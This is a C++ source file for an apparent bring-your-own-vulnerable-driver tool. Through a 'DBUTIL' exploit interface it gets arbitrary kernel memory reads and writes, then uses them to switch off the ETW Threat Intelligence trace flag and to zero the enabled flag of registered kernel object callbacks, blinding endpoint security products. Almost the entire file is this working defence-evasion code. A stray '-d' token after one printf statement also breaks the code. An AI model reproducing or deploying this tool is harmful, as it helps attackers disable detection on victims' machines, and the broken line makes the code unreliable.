#include "dbutil.h"
#include <winhttp.h>
#pragma comment(lib, "Winhttp.lib")
#include <vector>
#include <iostream>
//#include <assert.h>

typedef enum OB_OPERATION_e {
	OB_OPERATION_HANDLE_CREATE = 1,
	OB_OPERATION_HANDLE_DUPLICATE = 2,
	OB_FLT_REGISTRATION_VERSION = 0x100
} OB_OPERATION;

typedef struct UNICODE_STRING_t {
	USHORT Length;
	USHORT MaximumLength;
	PWCH Buffer;
} UNICODE_STRING;

#define GET_OFFSET(STRUCTNAME, OFFSETNAME) Offset_ ## STRUCTNAME ## _ ## OFFSETNAME = GetFieldOffset(sym_ctx, #STRUCTNAME, L###OFFSETNAME)
#define GET_SYMBOL(SYMBOL) Sym_ ## SYMBOL = GetSymbolOffset(sym_ctx, #SYMBOL)

DECLARE_OFFSET(_OBJECT_TYPE, Name);
DECLARE_OFFSET(_OBJECT_TYPE, TotalNumberOfObjects);
DECLARE_OFFSET(_OBJECT_TYPE, TypeInfo);
DECLARE_OFFSET(_OBJECT_TYPE_INITIALIZER, ObjectTypeFlags);
DECLARE_SYMBOL(ObpObjectTypes);
DECLARE_SYMBOL(ObpTypeObjectType);

typedef struct OB_CALLBACK_t OB_CALLBACK;

typedef PVOID POBJECT_TYPE, POB_PRE_OPERATION_CALLBACK, POB_POST_OPERATION_CALLBACK;
/*
* Internal / undocumented version of OB_OPERATION_REGISTRATION
*/
// TODO: Rewrite as Class with dynamic memory reads on members (dynamic resolution->members as functions resolved through memoryread)
typedef struct OB_CALLBACK_ENTRY_t {
	LIST_ENTRY CallbackList; // linked element tied to _OBJECT_TYPE.CallbackList
	OB_OPERATION Operations; // bitfield : 1 for Creations, 2 for Duplications
	BOOL Enabled;            // self-explanatory
	OB_CALLBACK* Entry;      // points to the structure in which it is included
	POBJECT_TYPE ObjectType; // points to the object type affected by the callback
	POB_PRE_OPERATION_CALLBACK PreOperation;      // callback function called before each handle operation
	POB_POST_OPERATION_CALLBACK PostOperation;     // callback function called after each handle operation
	KSPIN_LOCK Lock;         // lock object used for synchronization
} OB_CALLBACK_ENTRY;

/*
* A callback entry is made of some fields followed by concatenation of callback entry items, and the buffer of the associated Altitude string
* Internal / undocumented (and compact) version of OB_CALLBACK_REGISTRATION
*/
typedef struct OB_CALLBACK_t {
	USHORT Version;                           // usually 0x100
	USHORT OperationRegistrationCount;        // number of registered callbacks
	PVOID RegistrationContext;                // arbitrary data passed at registration time
	UNICODE_STRING AltitudeString;            // used to determine callbacks order
	struct OB_CALLBACK_ENTRY_t EntryItems[1]; // array of OperationRegistrationCount items
	WCHAR AltitudeBuffer[1];                  // is AltitudeString.MaximumLength bytes long, and pointed by AltitudeString.Buffer
} OB_CALLBACK;

//TODO : find a way to reliably find the offsets
DWORD64 Offset_CALLBACK_ENTRY_ITEM_Operations = offsetof(OB_CALLBACK_ENTRY, Operations); //BOOL
DWORD64 Offset_CALLBACK_ENTRY_ITEM_Enabled = offsetof(OB_CALLBACK_ENTRY, Enabled); //DWORD
DWORD64 Offset_CALLBACK_ENTRY_ITEM_ObjectType = offsetof(OB_CALLBACK_ENTRY, ObjectType); //POBJECT_TYPE
DWORD64 Offset_CALLBACK_ENTRY_ITEM_PreOperation = offsetof(OB_CALLBACK_ENTRY, PreOperation); //POB_PRE_OPERATION_CALLBACK
DWORD64 Offset_CALLBACK_ENTRY_ITEM_PostOperation = offsetof(OB_CALLBACK_ENTRY, PostOperation); //POB_POST_OPERATION_CALLBACK

// Symbol Parsing
typedef struct PE_relocation_t {
	DWORD RVA;
	WORD Type : 4;
} PE_relocation;

typedef struct PE_codeview_debug_info_t {
	DWORD signature;
	GUID guid;
	DWORD age;
	CHAR pdbName[1];
} PE_codeview_debug_info;

typedef struct PE_pointers {
	BOOL isMemoryMapped;
	BOOL isInAnotherAddressSpace;
	HANDLE hProcess;
	PVOID baseAddress;
	//headers ptrs
	IMAGE_DOS_HEADER* dosHeader;
	IMAGE_NT_HEADERS* ntHeader;
	IMAGE_OPTIONAL_HEADER* optHeader;
	IMAGE_DATA_DIRECTORY* dataDir;
	IMAGE_SECTION_HEADER* sectionHeaders;
	//export info
	IMAGE_EXPORT_DIRECTORY* exportDirectory;
	LPDWORD exportedNames;
	DWORD exportedNamesLength;
	LPDWORD exportedFunctions;
	LPWORD exportedOrdinals;
	//relocations info
	DWORD nbRelocations;
	PE_relocation* relocations;
	//debug info
	IMAGE_DEBUG_DIRECTORY* debugDirectory;
	PE_codeview_debug_info* codeviewDebugInfo;
} PE;

typedef struct symbol_ctx_t {
	LPWSTR pdb_name_w;
	DWORD64 pdb_base_addr;
	HANDLE sym_handle;
} symbol_ctx;

PBYTE ReadFullFileW(LPCWSTR fileName) {
	HANDLE hFile = CreateFileW(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return NULL;
	}
	DWORD fileSize = GetFileSize(hFile, NULL);
	PBYTE fileContent = (PBYTE)malloc(fileSize); // cast
	DWORD bytesRead = 0;
	if (!ReadFile(hFile, fileContent, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
		free(fileContent);
		fileContent = NULL;
	}
	CloseHandle(hFile);
	return fileContent;
}

IMAGE_SECTION_HEADER* PE_sectionHeader_fromRVA(PE* pe, DWORD rva) {
	IMAGE_SECTION_HEADER* sectionHeaders = pe->sectionHeaders;
	for (DWORD sectionIndex = 0; sectionIndex < pe->ntHeader->FileHeader.NumberOfSections; sectionIndex++) {
		DWORD currSectionVA = sectionHeaders[sectionIndex].VirtualAddress;
		DWORD currSectionVSize = sectionHeaders[sectionIndex].Misc.VirtualSize;
		if (currSectionVA <= rva && rva < currSectionVA + currSectionVSize) {
			return &sectionHeaders[sectionIndex];
		}
	}
	return NULL;
}

PVOID PE_RVA_to_Addr(PE* pe, DWORD rva) {
	PVOID peBase = pe->dosHeader;
	if (pe->isMemoryMapped) {
		return (PBYTE)peBase + rva;
	}

	IMAGE_SECTION_HEADER* rvaSectionHeader = PE_sectionHeader_fromRVA(pe, rva);
	if (NULL == rvaSectionHeader) {
		return NULL;
	}
	else {
		return (PBYTE)peBase + rvaSectionHeader->PointerToRawData + (rva - rvaSectionHeader->VirtualAddress);
	}
}

PE* PE_create(PVOID imageBase, BOOL isMemoryMapped) {
	PE* pe = (PE*)calloc(1, sizeof(PE));
	if (NULL == pe) {
		exit(1);
	}
	pe->isMemoryMapped = isMemoryMapped;
	pe->isInAnotherAddressSpace = FALSE;
	pe->hProcess = INVALID_HANDLE_VALUE;
	pe->dosHeader = (IMAGE_DOS_HEADER*)imageBase; // cast
	pe->ntHeader = (IMAGE_NT_HEADERS*)(((PBYTE)imageBase) + pe->dosHeader->e_lfanew);
	pe->optHeader = &pe->ntHeader->OptionalHeader;
	if (isMemoryMapped) {
		pe->baseAddress = imageBase;
	}
	else {
		pe->baseAddress = (PVOID)pe->optHeader->ImageBase;
	}
	pe->dataDir = pe->optHeader->DataDirectory;
	pe->sectionHeaders = (IMAGE_SECTION_HEADER*)(((PBYTE)pe->optHeader) + pe->ntHeader->FileHeader.SizeOfOptionalHeader);
	DWORD exportRVA = pe->dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (exportRVA == 0) {
		pe->exportDirectory = NULL;
		pe->exportedNames = NULL;
		pe->exportedFunctions = NULL;
		pe->exportedOrdinals = NULL;
	}
	else {
		pe->exportDirectory = (IMAGE_EXPORT_DIRECTORY*)PE_RVA_to_Addr(pe, exportRVA);
		pe->exportedNames = (LPDWORD)PE_RVA_to_Addr(pe, pe->exportDirectory->AddressOfNames);
		pe->exportedFunctions = (LPDWORD)PE_RVA_to_Addr(pe, pe->exportDirectory->AddressOfFunctions);
		pe->exportedOrdinals = (LPWORD)PE_RVA_to_Addr(pe, pe->exportDirectory->AddressOfNameOrdinals);
		pe->exportedNamesLength = pe->exportDirectory->NumberOfNames;
	}
	pe->relocations = NULL;
	DWORD debugRVA = pe->dataDir[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress;
	if (debugRVA == 0) {
		pe->debugDirectory = NULL;
	}
	else {
		pe->debugDirectory = (IMAGE_DEBUG_DIRECTORY*)PE_RVA_to_Addr(pe, debugRVA);
		if (pe->debugDirectory->Type != IMAGE_DEBUG_TYPE_CODEVIEW) {
			pe->debugDirectory = NULL;
		}
		else {
			pe->codeviewDebugInfo = (PE_codeview_debug_info*)PE_RVA_to_Addr(pe, pe->debugDirectory->AddressOfRawData);
			if (pe->codeviewDebugInfo->signature != *((DWORD*)"RSDS")) {
				pe->debugDirectory = NULL;
				pe->codeviewDebugInfo = NULL;
			}
		}
	}
	return pe;
}

VOID PE_destroy(PE* pe)
{
	if (pe->relocations) {
		free(pe->relocations);
		pe->relocations = NULL;
	}
	free(pe);
}

BOOL FileExistsW(LPCWSTR szPath)
{
	DWORD dwAttrib = GetFileAttributesW(szPath);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
		!(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL WriteFullFileW(LPCWSTR fileName, PBYTE fileContent, SIZE_T fileSize) {
	HANDLE hFile = CreateFileW(fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}
	BOOL res = WriteFile(hFile, fileContent, (DWORD)fileSize, NULL, NULL);
	CloseHandle(hFile);
	return res;
}

BOOL HttpsDownloadFullFile(LPCWSTR domain, LPCWSTR uri, PBYTE* output, SIZE_T* output_size) {
	///wprintf_or_not(L"Downloading https://%s%s...\n", domain, uri);
	// Get proxy configuration
	WINHTTP_CURRENT_USER_IE_PROXY_CONFIG proxyConfig;
	WinHttpGetIEProxyConfigForCurrentUser(&proxyConfig);
	BOOL proxySet = !(proxyConfig.fAutoDetect || proxyConfig.lpszAutoConfigUrl != NULL);
	DWORD proxyAccessType = proxySet ? ((proxyConfig.lpszProxy == NULL) ?
		WINHTTP_ACCESS_TYPE_NO_PROXY : WINHTTP_ACCESS_TYPE_NAMED_PROXY) : WINHTTP_ACCESS_TYPE_NO_PROXY;
	LPCWSTR proxyName = proxySet ? proxyConfig.lpszProxy : WINHTTP_NO_PROXY_NAME;
	LPCWSTR proxyBypass = proxySet ? proxyConfig.lpszProxyBypass : WINHTTP_NO_PROXY_BYPASS;

	// Initialize HTTP session and request
	HINTERNET hSession = WinHttpOpen(L"WinHTTP/1.0", proxyAccessType, proxyName, proxyBypass, 0);
	if (hSession == NULL) {
		printf("WinHttpOpen failed with error : 0x%x\n", GetLastError());
		return FALSE;
	}
	HINTERNET hConnect = WinHttpConnect(hSession, domain, INTERNET_DEFAULT_HTTPS_PORT, 0);
	if (!hConnect) {
		printf("WinHttpConnect failed with error : 0x%x\n", GetLastError());
		return FALSE;
	}
	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", uri, NULL,
		WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
	if (!hRequest) {
		return FALSE;
	}

	// Configure proxy manually
	if (!proxySet)
	{
		WINHTTP_AUTOPROXY_OPTIONS  autoProxyOptions;
		autoProxyOptions.dwFlags = proxyConfig.lpszAutoConfigUrl != NULL ? WINHTTP_AUTOPROXY_CONFIG_URL : WINHTTP_AUTOPROXY_AUTO_DETECT;
		autoProxyOptions.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
		autoProxyOptions.fAutoLogonIfChallenged = TRUE;

		if (proxyConfig.lpszAutoConfigUrl != NULL)
			autoProxyOptions.lpszAutoConfigUrl = proxyConfig.lpszAutoConfigUrl;

		WCHAR szUrl[MAX_PATH] = { 0 };
		swprintf_s(szUrl, _countof(szUrl), L"https://%ws%ws", domain, uri);

		WINHTTP_PROXY_INFO proxyInfo;
		WinHttpGetProxyForUrl(
			hSession,
			szUrl,
			&autoProxyOptions,
			&proxyInfo);

		WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY, &proxyInfo, sizeof(proxyInfo));
		DWORD logonPolicy = WINHTTP_AUTOLOGON_SECURITY_LEVEL_LOW;
		WinHttpSetOption(hRequest, WINHTTP_OPTION_AUTOLOGON_POLICY, &logonPolicy, sizeof(logonPolicy));
	}

	// Perform request
	BOOL bRequestSent;
	do {
		bRequestSent = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	} while (!bRequestSent && GetLastError() == ERROR_WINHTTP_RESEND_REQUEST);
	if (!bRequestSent) {
		return FALSE;
	}
	BOOL bResponseReceived = WinHttpReceiveResponse(hRequest, NULL);
	if (!bResponseReceived) {
		return FALSE;
	}

	// Read response
	DWORD dwAvailableSize = 0;
	DWORD dwDownloadedSize = 0;
	SIZE_T allocatedSize = 4096;
	if (!WinHttpQueryDataAvailable(hRequest, &dwAvailableSize))
	{
		return FALSE;
	}
	*output = (PBYTE)malloc(allocatedSize);
	*output_size = 0;
	while (dwAvailableSize)
	{
		while (*output_size + dwAvailableSize > allocatedSize) {
			allocatedSize *= 2;
			PBYTE new_output = (PBYTE)realloc(*output, allocatedSize);
			if (new_output == NULL)
			{
				return FALSE;
			}
			*output = new_output;
		}
		if (!WinHttpReadData(hRequest, *output + *output_size, dwAvailableSize, &dwDownloadedSize))
		{
			return FALSE;
		}
		*output_size += dwDownloadedSize;

		WinHttpQueryDataAvailable(hRequest, &dwAvailableSize);
	}
	PBYTE new_output = (PBYTE)realloc(*output, *output_size);
	if (new_output == NULL)
	{
		return FALSE;
	}
	*output = new_output;
	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);
	return TRUE;
}

BOOL DownloadPDB(GUID guid, DWORD age, LPCWSTR pdb_name_w, PBYTE* file, SIZE_T* file_size) {
	WCHAR full_pdb_uri[MAX_PATH] = { 0 };
	swprintf_s(full_pdb_uri, _countof(full_pdb_uri), L"/download/symbols/%s/%08X%04hX%04hX%016llX%X/%s", pdb_name_w, guid.Data1, guid.Data2, guid.Data3, _byteswap_uint64(*((DWORD64*)guid.Data4)), age, pdb_name_w);
	return HttpsDownloadFullFile(L"msdl.microsoft.com", full_pdb_uri, file, file_size);
}

BOOL DownloadPDBFromPE(PE* image_pe, PBYTE* file, SIZE_T* file_size) {
	WCHAR pdb_name_w[MAX_PATH] = { 0 };
	GUID guid = image_pe->codeviewDebugInfo->guid;
	DWORD age = image_pe->codeviewDebugInfo->age;
	MultiByteToWideChar(CP_UTF8, 0, image_pe->codeviewDebugInfo->pdbName, -1, pdb_name_w, _countof(pdb_name_w));
	return DownloadPDB(guid, age, pdb_name_w, file, file_size);
}

symbol_ctx* LoadSymbolsFromPE(PE* pe) {
	symbol_ctx* ctx = (symbol_ctx*)calloc(1, sizeof(symbol_ctx));
	if (ctx == NULL) {
		return NULL;
	}
	int size_needed = MultiByteToWideChar(CP_UTF8, 0, pe->codeviewDebugInfo->pdbName, -1, NULL, 0);
	ctx->pdb_name_w = (LPWSTR)calloc(size_needed, sizeof(WCHAR));
	MultiByteToWideChar(CP_UTF8, 0, pe->codeviewDebugInfo->pdbName, -1, ctx->pdb_name_w, size_needed);
	if (!FileExistsW(ctx->pdb_name_w)) {
		PBYTE file;
		SIZE_T file_size;
		BOOL res = DownloadPDBFromPE(pe, &file, &file_size);
		if (!res) {
			free(ctx);
			return NULL;
		}
		WriteFullFileW(ctx->pdb_name_w, file, file_size);
		free(file);
	}
	else {
		//TODO : check if exisiting PDB corresponds to the file version
	}
	DWORD64 asked_pdb_base_addr = 0x1337000;
	DWORD pdb_image_size = MAXDWORD;
	HANDLE cp = GetCurrentProcess();
	if (!SymInitialize(cp, NULL, FALSE)) {
		free(ctx);
		return NULL;
	}
	ctx->sym_handle = cp;

	DWORD64 pdb_base_addr = SymLoadModuleExW(cp, NULL, ctx->pdb_name_w, NULL, asked_pdb_base_addr, pdb_image_size, NULL, 0);
	while (pdb_base_addr == 0) {
		DWORD err = GetLastError();
		if (err == ERROR_SUCCESS)
			break;
		if (err == ERROR_FILE_NOT_FOUND) {
			printf("PDB file not found\n");
			SymUnloadModule(cp, asked_pdb_base_addr);//TODO : fix handle leak
			SymCleanup(cp);
			free(ctx);
			return NULL;
		}
		printf("SymLoadModuleExW, error 0x%x\n", GetLastError());
		asked_pdb_base_addr += 0x1000000;
		pdb_base_addr = SymLoadModuleExW(cp, NULL, ctx->pdb_name_w, NULL, asked_pdb_base_addr, pdb_image_size, NULL, 0);
	}
	ctx->pdb_base_addr = pdb_base_addr;
	return ctx;
}

symbol_ctx* LoadSymbolsFromImageFile(LPCWSTR image_file_path) {
	PVOID image_content = ReadFullFileW(image_file_path);
	PE* pe = PE_create(image_content, FALSE);
	symbol_ctx* ctx = LoadSymbolsFromPE(pe);
	PE_destroy(pe);
	free(image_content);
	return ctx;
}
// Save till here

DWORD64 GetSymbolOffset(symbol_ctx* ctx, LPCSTR symbol_name) {
	SYMBOL_INFO_PACKAGE si = { 0 };
	si.si.SizeOfStruct = sizeof(SYMBOL_INFO);
	si.si.MaxNameLen = sizeof(si.name);
	BOOL res = SymGetTypeFromName(ctx->sym_handle, ctx->pdb_base_addr, symbol_name, &si.si);
	if (res) {
		return si.si.Address - ctx->pdb_base_addr;
	}
	else {
		return 0;
	}
}

DWORD GetFieldOffset(symbol_ctx* ctx, LPCSTR struct_name, LPCWSTR field_name) {
	SYMBOL_INFO_PACKAGE si = { 0 };
	si.si.SizeOfStruct = sizeof(SYMBOL_INFO);
	si.si.MaxNameLen = sizeof(si.name);
	BOOL res = SymGetTypeFromName(ctx->sym_handle, ctx->pdb_base_addr, struct_name, &si.si);
	if (!res) {
		return 0;
	}

	TI_FINDCHILDREN_PARAMS* childrenParam = (TI_FINDCHILDREN_PARAMS*)calloc(1, sizeof(TI_FINDCHILDREN_PARAMS));
	if (childrenParam == NULL) {
		return 0;
	}

	res = SymGetTypeInfo(ctx->sym_handle, ctx->pdb_base_addr, si.si.TypeIndex, TI_GET_CHILDRENCOUNT, &childrenParam->Count);
	if (!res) {
		return 0;
	}
	TI_FINDCHILDREN_PARAMS* ptr = (TI_FINDCHILDREN_PARAMS*)realloc(childrenParam, sizeof(TI_FINDCHILDREN_PARAMS) + childrenParam->Count * sizeof(ULONG));
	if (ptr == NULL) {
		free(childrenParam);
		return 0;
	}
	childrenParam = ptr;
	res = SymGetTypeInfo(ctx->sym_handle, ctx->pdb_base_addr, si.si.TypeIndex, TI_FINDCHILDREN, childrenParam);
	DWORD offset = 0;
	for (ULONG i = 0; i < childrenParam->Count; i++) {
		ULONG childID = childrenParam->ChildId[i];
		WCHAR* name = NULL;
		SymGetTypeInfo(ctx->sym_handle, ctx->pdb_base_addr, childID, TI_GET_SYMNAME, &name);
		if (wcscmp(field_name, name)) {
			continue;
		}
		SymGetTypeInfo(ctx->sym_handle, ctx->pdb_base_addr, childID, TI_GET_OFFSET, &offset);
		break;
	}
	free(childrenParam);
	return offset;
}

void UnloadSymbols(symbol_ctx* ctx, BOOL delete_pdb) {
	SymUnloadModule(ctx->sym_handle, ctx->pdb_base_addr);
	SymCleanup(ctx->sym_handle);
	if (delete_pdb) {
		DeleteFileW(ctx->pdb_name_w);
	}
	free(ctx->pdb_name_w);
	ctx->pdb_name_w = NULL;
	free(ctx);
}

void FindDriver(DWORD64 address) {

	LPVOID drivers[1024];
	DWORD cbNeeded;
	int cDrivers, i;
	DWORD64 diff[3][200];
	TCHAR szDriver[1024];

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
		int n = sizeof(drivers) / sizeof(drivers[0]);
		cDrivers = cbNeeded / sizeof(drivers[0]);
		int narrow = 0;
		int c = 0;
		for (i = 0; i < cDrivers; i++) {
			//we add all smaller addresses of drivers to a new array, then grab the closest. Not great, I know...
			if (address > (DWORD64)drivers[i]) {
				diff[0][c] = address;
				diff[1][c] = address - (DWORD64)drivers[i];
				diff[2][c] = (DWORD64)drivers[i];
				c++;
			}
		}
	}
	//cheeky for loop to find the smallest diff. smallest diff should be the diff of DriverBase + Diff == Callback function.
	int k = 0;
	DWORD64 temp = diff[1][0];
	for (k = 0; k < cDrivers; k++) {
		if ((temp > diff[1][k]) && (diff[0][k] == address)) {
			temp = diff[1][k];

		}
	}

	if (GetDeviceDriverBaseName(LPVOID(address - temp), szDriver, sizeof(szDriver))) {
		std::cout << "[+] " << std::hex << address << " [";
		std::wcout << szDriver << " + 0x";
		std::cout << std::hex << (int)temp;
		std::cout << "]" << std::endl;
	}
	else {
		printf("[!] Could not resolve driver for %p\n", address);
	}

}

void EnumAllObjectsCallbacks(DBUTIL* ExploitManager, DWORD64 ntoskrnlBaseAddress) {
	LPTSTR ntoskrnlPath;
	TCHAR g_ntoskrnlPath[MAX_PATH] = { 0 };
	_tcscat_s(g_ntoskrnlPath, _countof(g_ntoskrnlPath), TEXT("C:\\Windows\\System32\\ntoskrnl.exe"));
	ntoskrnlPath = g_ntoskrnlPath;
	// get object types count
	/*if (!Offset__OBJECT_TYPE_Name) { // yes->Symbols and offsets already loaded
	}*/
	symbol_ctx* sym_ctx = LoadSymbolsFromImageFile(ntoskrnlPath);
	if (sym_ctx == NULL) {
		printf("Symbols not available, download failed, aborting...\n");
		exit(1);
	}
	else {
		printf("[+] Ntoskrnl.exe symbols now available!\n");
	}
	// Save till here
	GET_OFFSET(_OBJECT_TYPE, Name);
	GET_OFFSET(_OBJECT_TYPE, TotalNumberOfObjects);
	GET_OFFSET(_OBJECT_TYPE, TypeInfo);
	GET_OFFSET(_OBJECT_TYPE_INITIALIZER, ObjectTypeFlags);
	GET_SYMBOL(ObpObjectTypes);
	GET_SYMBOL(ObpTypeObjectType);
	//UnloadSymbols(sym_ctx, false);

	printf("Symbol ObpTypeObjectType: 0x%llx\n", Sym_ObpTypeObjectType);
	unsigned long long buffer[3];
	ExploitManager->VirtualRead(ntoskrnlBaseAddress + Sym_ObpTypeObjectType, &buffer, 8);
	printf("Dereferenced ObpTypeObjectType: 0x%llx\n", *buffer);
	if (*buffer == 0x0) {
		printf("[!]Error reading physical memory. Is driver running? Rerun program!\n");
		exit(1);
	}
	unsigned long long ntoskrnl_OBJECT_TYPE = *buffer;
	printf("Next read at: 0x%llx\n", *buffer + Offset__OBJECT_TYPE_TotalNumberOfObjects);
	ExploitManager->VirtualRead(*buffer + Offset__OBJECT_TYPE_TotalNumberOfObjects, &buffer, 1);
	uint8_t ntoskrnl_OBJECT_TYPE_TotalNumberOfObject = *buffer;
	DWORD64 callbacklistOffset = 0x0c8;
	printf("ObpObjectTypes: 0x%llx\n", Sym_ObpObjectTypes);
	unsigned long long ObjectType;
	
	for (DWORD i = 0; i < (DWORD)ntoskrnl_OBJECT_TYPE_TotalNumberOfObject; i++) {
		printf("Next read at: 0x%llx\n", ntoskrnlBaseAddress + Sym_ObpObjectTypes + i * sizeof(DWORD64));
		ExploitManager->ReadMemory(ntoskrnlBaseAddress + Sym_ObpObjectTypes + i * sizeof(DWORD64), &buffer, 8);
		ObjectType = *buffer;
		ExploitManager->ReadMemory(ObjectType + 0x010 + 0x002, &buffer, 8); // ? read maximum length
		uint8_t maxNameLength = *buffer;
		ExploitManager->ReadMemory(ObjectType + 0x010 + 0x008, &buffer, 8);
		WCHAR typeName[256] = { 0 }; // TODO: NOP change to dynamic allocation
		ExploitManager->ReadMemory(*buffer, typeName, maxNameLength);
		printf("Object Type Name: %ls\n", typeName);
		ExploitManager->ReadMemory(ObjectType + 0x0c8, &buffer, 8);
		unsigned long long ObjectType_Callbacks_List = *buffer;
		printf("Object Type CallbackList Address: 0x%llx\n", ObjectType_Callbacks_List);
		DWORD64 obOperationType = ObjectType_Callbacks_List + 0x10;
		DWORD64 obStatus = ObjectType_Callbacks_List + 0x14;
		DWORD64 pObjectType = ObjectType_Callbacks_List + 0x20;
		DWORD64 obPreOperation = ObjectType_Callbacks_List + 0x28;
		DWORD64 obPostOperation = ObjectType_Callbacks_List + 0x30;
		ExploitManager->ReadMemory(obStatus, &buffer, 8);
		if ((uint8_t)*buffer != 0x1) {
			continue;
		}
		printf("obOperationType at: 0x%llx\n", obOperationType);
		printf("obStatus at: 0x%llx\n", obStatus);
		printf("pObjectType at: 0x%llx\n", pObjectType);
		printf("obPreOperation at: 0x%llx\n", obPreOperation);
		printf("obPostOperation at: 0x%llx\n", obPostOperation);
		if (obPreOperation != 0x0000000000000000) {
			ExploitManager->ReadMemory(obPreOperation, &buffer, 8);
			FindDriver(*buffer);
		}
		if (obPostOperation != 0x0000000000000000) {
			ExploitManager->ReadMemory(obPostOperation, &buffer, 8);
			FindDriver(*buffer);
		}
		ExploitManager->ReadMemory(obStatus, &buffer, 4);
		printf("Callback Status: 0x%llx\n", *buffer);-d
		unsigned long long writeBuffer = 0x00000000;
		ExploitManager->WriteMemory(obStatus, &writeBuffer, 4);
	}

	getchar();
	printf("The quiter you are the more youre able to hear!\n");
	return;
}

int main() {

	DBUTIL* ExploitManager = new DBUTIL();
	DWORD64 ntoskrnlBaseAddress = ExploitManager->GetKernelBase("ntoskrnl.exe");
	printf("[+] Base address of ntoskrnl.exe: 0x%llx\n", ntoskrnlBaseAddress);
	
	// Disable EtwThreatIntProcHandle Trace Flag
	unsigned long long ntMiGetPTEAddress = ntoskrnlBaseAddress + 0xffff88f8f5c00000;
	printf("[+] Base of the PTEs: 0x%llx\n", ntMiGetPTEAddress);
	HMODULE Ntoskrnl = LoadLibraryExA("Ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (Ntoskrnl == NULL) {
		printf("[!] Unable to load Ntoskrnl.exe: %lu\n", GetLastError());
		return 0;
	}

	LPVOID pSymbol = GetProcAddress(Ntoskrnl, "KeInsertQueueApc");
	if (pSymbol == NULL) {
		printf("[!] Unable to find address of exported KeInsertQueueApc: %lu\n", GetLastError());
		return 0;
	}
	DWORD distance = 0;
	for (int i = 0; i < 100; i++) {
		if ((((PBYTE)pSymbol)[i] == 0x48) && (((PBYTE)pSymbol)[i + 1] == 0x8B) && (((PBYTE)pSymbol)[i + 2] == 0x0D)) {
			distance = *(PDWORD)((DWORD_PTR)pSymbol + i + 3);
			pSymbol = (LPVOID)((DWORD_PTR)pSymbol + i + distance + 7);
			break;
		}
	}
	DWORD_PTR symbolOffset = (DWORD)pSymbol - (DWORD)Ntoskrnl;
	unsigned long long ntEtwThreatIntProvRegHandleAddress = ntoskrnlBaseAddress + symbolOffset;
	unsigned long long buffer[16];
	ExploitManager->VirtualRead(ntEtwThreatIntProvRegHandleAddress, &buffer, 8);
	ExploitManager->VirtualRead(*buffer + 0x20, &buffer, 8);
	unsigned long long traceEnableAddress = *buffer + 0x60;
	ExploitManager->VirtualRead(*buffer + 0x60, &buffer, 8);
	printf("[+] TraceEnableAddress: 0x%llx\n", traceEnableAddress);
	printf("[+] TraceEnableStatus: 0x%llx\n", *buffer);

	TCHAR file[MAX_PATH];
	GetModuleFileNameA(NULL, file, _countof(file));
	std::string fileStr(file);
	int pos = fileStr.find_last_of("\\");
	std::string processName = fileStr.substr(pos + 1);
	std::string outputPath = fileStr.substr(0, pos);
	printf("Current process name: %s\n", processName.c_str());
	
	unsigned long long enable[2];
	unsigned long long disable[2];
	enable[0] = 1; enable[1] = 0;
	disable[0] = 0; disable[1] = 0;
	
	ExploitManager->VirtualWrite(traceEnableAddress, disable, 8);
	
	// Disable Callbacks
	EnumAllObjectsCallbacks(ExploitManager, ntoskrnlBaseAddress);

}